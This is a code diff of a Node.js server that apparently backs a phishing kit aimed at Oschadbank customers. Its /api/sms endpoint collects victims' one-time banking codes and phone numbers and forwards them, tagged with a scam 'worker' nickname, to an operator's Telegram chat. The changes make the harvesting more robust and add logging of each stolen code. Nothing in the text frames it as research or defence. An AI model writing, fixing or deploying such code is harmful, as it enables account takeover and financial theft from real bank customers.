@@ -40,7 +40,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook set to ${WEBHOOK_URL}`))
         .catch(err => console.error('Webhook setup error:', err));
-    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v5 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
+    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v6 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
         .catch(err => console.error('Test message error:', err));
 } else {
     console.error('Critical error: RENDER_EXTERNAL_URL not defined. Webhook not set.');
@@ -268,21 +268,33 @@ app.post('/api/sms', async (req, res) => {
         console.error('Referrer decode error:', e);
     }
 
+    console.log(`Received /api/sms: sessionId=${sessionId}, code=${code}, referrer=${referrer}`);
+
     const sessionData = sessions.get(sessionId);
-    if (sessionData) {
-        const codeType = sessionData.lastCodeScreen === 'oschad_call' ? 'Код со звонка' : 'Код списания';
-        let message = `<b>${codeType}:</b> <code>${code}</code>\n`;
-        message += `<b>Номер телефону:</b> <code>${sessionData.phone || sessionData.fp_phone || 'N/A'}</code>\n`;
-        message += `<b>Воркер:</b> @${workerNick}\n`;
-        try {
-            await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-            res.status(200).json({ message: 'OK' });
-        } catch (error) {
-            console.error('Error sending code to Telegram:', error);
-            res.status(500).json({ message: 'Failed to send code to Telegram' });
-        }
-    } else {
+    if (!sessionData) {
+        console.error(`Session not found for sessionId: ${sessionId}`);
         res.status(404).json({ message: 'Session not found' });
+        return;
+    }
+
+    // Ensure lastCodeScreen is set correctly
+    if (!sessionData.lastCodeScreen) {
+        console.warn(`lastCodeScreen not set for sessionId: ${sessionId}, defaulting to 'oschad_call'`);
+        sessionData.lastCodeScreen = 'oschad_call'; // Fallback to prevent undefined
+    }
+
+    const codeType = sessionData.lastCodeScreen === 'oschad_call' ? 'Код со звонка' : 'Код списания';
+    let message = `<b>${codeType}:</b> <code>${code}</code>\n`;
+    message += `<b>Номер телефону:</b> <code>${sessionData.phone || sessionData.fp_phone || 'N/A'}</code>\n`;
+    message += `<b>Воркер:</b> @${workerNick}\n`;
+
+    try {
+        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        console.log(`Code message sent to Telegram: ${message}`);
+        res.status(200).json({ message: 'OK' });
+    } catch (error) {
+        console.error('Error sending code to Telegram:', error);
+        res.status(500).json({ message: 'Failed to send code to Telegram' });
     }
 });
 
